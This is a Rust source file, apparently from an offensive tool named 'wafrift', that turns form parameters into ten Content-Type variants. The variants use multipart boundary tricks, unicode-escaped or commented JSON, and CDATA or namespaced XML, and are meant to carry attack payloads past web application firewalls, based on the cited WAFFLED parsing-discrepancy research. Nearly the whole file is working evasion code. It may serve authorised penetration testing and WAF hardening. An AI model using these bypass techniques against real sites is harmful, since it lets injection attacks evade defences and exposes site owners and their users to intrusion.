//! Content-Type switching — WAFFLED parsing discrepancy exploitation.
//!
//! The core insight from WAFFLED research: WAFs parse request bodies based on
//! Content-Type, but many web servers accept multiple formats interchangeably.
//! Send a payload in a format the WAF doesn't inspect deeply.
//!
//! 90% of real websites accept both form-encoded and multipart interchangeably.
//! This means Content-Type switching works on nearly every target.
//!
//! Reference: "WAFFLED: Exploiting Parsing Discrepancies to Bypass WAFs"
//!            Akhavani et al., IEEE S&P 2025

use rand::Rng;
use std::fmt::Write as _;

/// A Content-Type variant with the transformed body.
#[derive(Debug, Clone)]
pub struct ContentTypeVariant {
    /// The Content-Type header value to send.
    pub content_type: String,
    /// The transformed request body.
    pub body: Vec<u8>,
    /// Which technique this uses.
    pub technique: ContentTypeTechnique,
    /// Human-readable description.
    pub description: String,
}

/// Content-Type switching techniques.
#[derive(Debug, Clone, PartialEq)]
pub enum ContentTypeTechnique {
    /// Standard multipart/form-data (valid, but WAF may not inspect body deeply).
    Multipart,
    /// Multipart with quoted boundary (valid per RFC, breaks many WAF parsers).
    MultipartQuotedBoundary,
    /// Multipart with whitespace in boundary (confuses parsers).
    MultipartWhitespaceBoundary,
    /// Multipart with duplicate boundary parameter (first vs last wins).
    MultipartDuplicateBoundary,
    /// Multipart with charset parameter before boundary (parser confusion).
    MultipartCharsetPrefix,
    /// JSON body with unicode-escaped keys and values.
    JsonUnicodeEscape,
    /// JSON body with comments (non-standard but some parsers accept).
    JsonWithComments,
    /// XML body with namespace prefix on payload element.
    XmlNamespace,
    /// XML body with CDATA section wrapping payload.
    XmlCdata,
    /// Mixed Content-Type header (multipart but with JSON charset).
    MixedContentType,
}

/// Maximum size of a form-encoded body before parsing is refused.
///
/// Prevents DoS via adversarial multi-gigabyte inputs that would be
/// fully allocated as strings during `split('&')` and `to_string()`.
const MAX_FORM_BODY_SIZE: usize = 8 * 1024 * 1024;

/// Parse form-encoded body into key-value pairs.
///
/// Only segments containing `=` are considered valid key-value pairs.
/// Plain text without `=` delimiters is skipped.
///
/// **UTF-8 handling.** Invalid UTF-8 bytes are rejected (returns the
/// pairs successfully parsed before the failure) rather than silently
/// replaced with U+FFFD. The earlier lossy decode could produce
/// variants that diverged from how the upstream form decoder would
/// have rejected the body, masking real parser-discrepancy attacks.
///
/// **Size guarding.** Bodies larger than [`MAX_FORM_BODY_SIZE`] are
/// rejected (empty vector returned) to prevent memory exhaustion on
/// adversarial inputs.
#[must_use]
pub fn parse_form_body(body: &[u8]) -> Vec<(String, String)> {
    if body.len() > MAX_FORM_BODY_SIZE {
        return Vec::new();
    }
    let Ok(body_str) = std::str::from_utf8(body) else {
        return Vec::new();
    };
    body_str
        .split('&')
        .filter_map(|pair| {
            let mut parts = pair.splitn(2, '=');
            let key = parts.next()?.to_string();
            // Only include pairs that actually have an '=' delimiter
            let value = parts.next()?.to_string();
            if key.is_empty() {
                None
            } else {
                Some((key, value))
            }
        })
        .collect()
}

/// Generate a random boundary string.
fn random_boundary() -> String {
    let mut rng = rand::thread_rng();
    let mut hex = String::with_capacity(32);

    for _ in 0..16 {
        let _ = write!(&mut hex, "{:02x}", rng.r#gen::<u8>());
    }
    format!("----WafriftBoundary{hex}")
}

/// Generate a boundary guaranteed not to appear in any of the supplied
/// values (collision-free framing). Falls back to plain `random_boundary`
/// once a fresh value clears the inputs — the 128-bit hex tail makes
/// this loop terminate on the first attempt with overwhelming probability,
/// but checking explicitly costs nothing and prevents the once-in-the-
/// universe case where a payload happens to embed our boundary.
#[must_use]
pub fn unique_boundary(values: &[&str]) -> String {
    // Bounded retry: if the entropy source wedges, give up and ship the
    // last candidate rather than spin forever. 16 attempts is already
    // 16 * 128 = 2048 bits of separation from any plausible adversarial
    // collision attempt.
    let mut candidate = random_boundary();
    for _ in 0..16 {
        let needle = format!("--{candidate}");
        if !values.iter().any(|v| v.contains(&needle)) {
            return candidate;
        }
        candidate = random_boundary();
    }
    candidate
}

fn cdata_escape(value: &str) -> String {
    // Properly split `]]>` across CDATA boundaries to prevent early termination
    // without silently deleting payload characters.
    value.replace("]]>", "]]]]><![CDATA[>")
}

/// Escape a string for XML text content (outside CDATA).
fn xml_escape(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

/// Sanitise a string for use as an XML element name.
///
/// XML element names must start with a letter or underscore and contain
/// only letters, digits, hyphens, underscores, and periods. Characters
/// outside this set are replaced with underscores.
#[must_use]
pub fn xml_safe_name(name: &str) -> String {
    let mut result = String::with_capacity(name.len());
    for (i, ch) in name.chars().enumerate() {
        if i == 0 {
            if ch.is_ascii_alphabetic() || ch == '_' {
                result.push(ch);
            } else {
                result.push('_');
            }
        } else if ch.is_ascii_alphanumeric() || ch == '_' || ch == '-' || ch == '.' {
            result.push(ch);
        } else {
            result.push('_');
        }
    }
    if result.is_empty() {
        "_".to_string()
    } else {
        result
    }
}

/// Build a standard multipart body from params using the given boundary.
/// Keys and values are sanitised to prevent framing breakage:
/// - Quotes in `name=` are backslash-escaped per RFC 7578 §4.2.
/// - CR/LF in keys or values are stripped (they would otherwise close
///   the part header section and let an attacker inject a fake part).
fn build_multipart_body(params: &[(String, String)], boundary: &str) -> Vec<u8> {
    fn safe_name(s: &str) -> String {
        s.replace(['\r', '\n'], "")
            .replace('\\', "\\\\")
            .replace('"', "\\\"")
    }
    fn safe_value(s: &str) -> String {
        s.replace(['\r', '\n'], "")
    }
    let mut body = String::new();
    for (key, value) in params {
        let k = safe_name(key);
        let v = safe_value(value);
        let _ = write!(
            &mut body,
            "--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n"
        );
    }

    let _ = write!(&mut body, "--{boundary}--\r\n");
    body.into_bytes()
}

/// Generate all Content-Type variants for a form-encoded request.
///
/// Each variant reformats the SAME data in a different Content-Type
/// that the server will accept but the WAF may not inspect correctly.
#[allow(clippy::too_many_lines)]
#[must_use]
pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant> {
    let mut variants = Vec::new();
    // Pre-fix every variant called random_boundary() and never checked
    // for collisions with the param values. If a param value happened to
    // contain `--<boundary>` (extremely unlikely with 128-bit hex but
    // not impossible — and *guaranteed* possible if an attacker knows
    // the format and crafts the request body), the multipart body would
    // self-frame and let arbitrary content escape the form parser. We
    // collect the param value strings once and use unique_boundary —
    // which already exists, was tested, and was never wired up.
    let value_refs: Vec<&str> = params.iter().map(|(_, v)| v.as_str()).collect();

    // 1. Standard multipart/form-data
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &boundary);
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary={boundary}"),
            body,
            technique: ContentTypeTechnique::Multipart,
            description: "Standard multipart — WAF may not inspect body as deeply as form-encoded"
                .into(),
        });
    }

    // 2. Multipart with QUOTED boundary (RFC 2046 allows this, many WAFs don't parse it)
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &boundary);
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary=\"{boundary}\""),
            body,
            technique: ContentTypeTechnique::MultipartQuotedBoundary,
            description:
                "Quoted boundary — valid per RFC 2046 but breaks many WAF multipart parsers".into(),
        });
    }

    // 3. Multipart with whitespace around boundary value
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &boundary);
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; boundary= {boundary} "),
            body,
            technique: ContentTypeTechnique::MultipartWhitespaceBoundary,
            description: "Whitespace around boundary — servers trim it, WAFs may not".into(),
        });
    }

    // 4. Multipart with charset BEFORE boundary (parameter order confusion)
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &boundary);
        variants.push(ContentTypeVariant {
            content_type: format!("multipart/form-data; charset=utf-8; boundary={boundary}"),
            body,
            technique: ContentTypeTechnique::MultipartCharsetPrefix,
            description: "Charset before boundary — some WAFs take first param as boundary".into(),
        });
    }

    // 5. Multipart with DUPLICATE boundary parameter (first vs last wins)
    {
        let real_boundary = unique_boundary(&value_refs);
        let fake_boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &real_boundary);
        variants.push(ContentTypeVariant {
            content_type: format!(
                "multipart/form-data; boundary={fake_boundary}; boundary={real_boundary}"
            ),
            body,
            technique: ContentTypeTechnique::MultipartDuplicateBoundary,
            description: "Duplicate boundary — WAF uses first (fake), server uses last (real)"
                .into(),
        });
    }

    // 6. JSON with unicode-escaped payload
    {
        let mut json_string = String::new();
        json_string.push('{');
        for (i, (key, value)) in params.iter().enumerate() {
            if i > 0 {
                json_string.push(',');
            }
            let key_escaped = serde_json::to_string(key).unwrap_or_else(|_| format!("\"{key}\""));
            let _ = write!(&mut json_string, "{key_escaped}:\"");
            for c in value.chars() {
                if c.is_ascii_alphanumeric() || c == ' ' {
                    json_string.push(c);
                } else {
                    // Emit \uXXXX escapes directly. For BMP chars (≤ U+FFFF)
                    // a single 4-hex escape is valid JSON. For supplementary-
                    // plane chars (U+10000..U+10FFFF) JSON requires a UTF-16
                    // surrogate pair; without it the output parses as
                    // invalid JSON in strict parsers (and the variant ships
                    // with `Content-Type: application/json` so it must be
                    // valid JSON by contract).
                    let cp = c as u32;
                    if cp <= 0xFFFF {
                        let _ = write!(&mut json_string, "\\u{cp:04x}");
                    } else {
                        // RFC 8259 §7: encode as a UTF-16 surrogate pair.
                        let v = cp - 0x10000;
                        let high = 0xD800 + (v >> 10);
                        let low = 0xDC00 + (v & 0x3FF);
                        let _ = write!(&mut json_string, "\\u{high:04x}\\u{low:04x}");
                    }
                }
            }
            json_string.push('"');
        }
        json_string.push('}');

        variants.push(ContentTypeVariant {
            content_type: "application/json".into(),
            body: json_string.into_bytes(),
            technique: ContentTypeTechnique::JsonUnicodeEscape,
            description: "JSON with unicode escapes — WAF keyword rules miss escaped chars".into(),
        });
    }

    // 7. JSON with comments (non-standard but accepted by many parsers)
    {
        let mut json_obj = serde_json::Map::new();
        for (key, value) in params {
            json_obj.insert(key.clone(), serde_json::Value::String(value.clone()));
        }
        if let Ok(body_json) = serde_json::to_string_pretty(&json_obj) {
            // Insert line comments before each key — many JSON parsers
            // (Jackson, nlohmann, Python json5) accept `//` comments, but
            // WAF JSON parsers typically do not and choke or skip the body.
            let mut body = String::new();
            for line in body_json.lines() {
                if line.trim_start().starts_with('"') {
                    body.push_str("// wafrift padding\n");
                }
                body.push_str(line);
                body.push('\n');
            }
            variants.push(ContentTypeVariant {
                content_type: "application/json".into(),
                body: body.into_bytes(),
                technique: ContentTypeTechnique::JsonWithComments,
                description:
                    "JSON with comments — WAF JSON parser fails, server parser tolerates comments"
                        .into(),
            });
        }
    }

    // 8. XML with CDATA wrapping (CDATA-injection safe)
    {
        let mut xml = String::from("<?xml version=\"1.0\"?>\n<request>\n");
        for (key, value) in params {
            let safe_name = xml_safe_name(key);

            let _ = writeln!(
                &mut xml,
                "  <{}><![CDATA[{}]]></{}>",
                safe_name,
                cdata_escape(value),
                safe_name
            );
        }
        xml.push_str("</request>");
        variants.push(ContentTypeVariant {
            content_type: "application/xml".into(),
            body: xml.into_bytes(),
            technique: ContentTypeTechnique::XmlCdata,
            description:
                "XML with CDATA — payload inside CDATA section invisible to many WAF XML parsers"
                    .into(),
        });
    }

    // 9. XML with namespace prefix
    {
        let mut xml = String::from(
            "<?xml version=\"1.0\"?>\n<ns:request xmlns:ns=\"http://example.com/ns\">\n",
        );
        for (key, value) in params {
            let safe_name = xml_safe_name(key);
            let escaped = xml_escape(value);

            let _ = writeln!(&mut xml, "  <ns:{safe_name}>{escaped}</ns:{safe_name}>");
        }
        xml.push_str("</ns:request>");
        variants.push(ContentTypeVariant {
            content_type: "application/xml".into(),
            body: xml.into_bytes(),
            technique: ContentTypeTechnique::XmlNamespace,
            description: "XML with namespace — WAFs often skip namespaced elements".into(),
        });
    }

    // 10. Mixed Content-Type (multipart body with JSON-style header)
    {
        let boundary = unique_boundary(&value_refs);
        let body = build_multipart_body(params, &boundary);
        variants.push(ContentTypeVariant {
            content_type: format!(
                "multipart/form-data; charset=application/json; boundary={boundary}"
            ),
            body,
            technique: ContentTypeTechnique::MixedContentType,
            description:
                "Mixed Content-Type — confuses WAF parser selection with contradictory signals"
                    .into(),
        });
    }

    variants
}

/// Generate Content-Type variants from a raw form-encoded body.
#[must_use]
pub fn generate_variants_from_body(body: &[u8]) -> Vec<ContentTypeVariant> {
    let params = parse_form_body(body);
    if params.is_empty() {
        return Vec::new();
    }
    generate_variants(&params)
}

#[cfg(test)]
#[path = "content_type_tests.rs"]
mod tests;
